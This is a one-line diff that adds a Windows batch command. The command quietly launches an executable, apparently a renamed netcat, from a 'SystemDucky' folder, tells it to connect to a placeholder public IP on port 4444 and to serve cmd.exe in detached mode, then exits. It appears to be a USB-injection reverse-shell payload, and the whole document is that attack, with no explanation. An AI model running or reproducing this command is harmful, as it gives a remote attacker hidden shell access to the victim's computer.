@@ -1,0 +1,1 @@
+START /MIN C:\SystemDucky\run.exe [::PUBLIC::IP::] 4444 -e cmd.exe -d ^& exit
